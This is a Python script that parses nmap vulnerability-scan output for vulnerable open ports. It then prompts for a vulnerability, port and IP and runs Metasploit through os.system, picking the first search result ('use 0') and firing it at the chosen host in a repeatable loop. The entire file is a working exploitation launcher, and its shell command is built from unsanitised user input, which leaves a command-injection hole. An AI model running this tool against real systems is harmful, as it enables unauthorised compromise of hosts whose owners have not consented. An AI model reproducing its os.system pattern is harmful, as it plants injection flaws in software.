import re
import os

CYAN = "\033[96m"
RED = "\033[91m"
RESTORE = "\033[0m"

def run_metasploit(selected_vulnerability, selected_port, selected_ip):
    metasploit_command = f"msfconsole -q -x 'search {selected_vulnerability}; use 0; set RHOSTS {selected_ip}; set RHOST {selected_ip}; set RPORT {selected_port}; run; exit'"
    os.system(metasploit_command)

# Read content from the file
with open("output.txt", "r") as file:
    sample_output = file.read()

# Define patterns for port and vulnerability
port_pattern = re.compile(r"(\d+)/tcp\s+open\s+(\S+)")
vulnerability_pattern = re.compile(r"VULNERABLE:(.*?)State: VULNERABLE", re.DOTALL)

# Find open ports
open_ports = re.findall(port_pattern, sample_output)

# Find vulnerabilities
vulnerabilities = re.findall(vulnerability_pattern, sample_output)

exploit_again = True

while exploit_again:
    # Iterate through each port
    for port, service in open_ports:
        # Find vulnerabilities for the current port
        vulnerabilities_for_port = re.findall(rf"{port}/tcp[^V]+VULNERABLE:(.*?)State: VULNERABLE", sample_output, re.DOTALL)

        # Only print information for ports with vulnerabilities
        if vulnerabilities_for_port:
            print(f"{RED}Vulnerable Port: {port}/tcp open {service} {RESTORE}")
            print("Vulnerabilities:")
            for vulnerability in vulnerabilities_for_port:
                # Extract the relevant information from the nested structure
                vuln_info = re.search(r"\|(.+?)\n", vulnerability, re.DOTALL)
                if vuln_info:
                    print(vuln_info.group(1).strip())

            # Add a line break after printing vulnerabilities for the current port
            print()

    # Ask user for input
    selected_vulnerability = input("Which Vulnerability You Need to Exploit? ")
    selected_port = input("Which Port? ")
    selected_ip = input("Which IP? ")  # Remove This For Production
    print("")

    run_metasploit(selected_vulnerability, selected_port, selected_ip)

    # Ask if the user wants to exploit again
    print("")
    user_choice = input("Thanks For Using This Tool! Exploit Again (yes/no)? ").lower()
    exploit_again = user_choice == "yes"

print("Goodbye!")
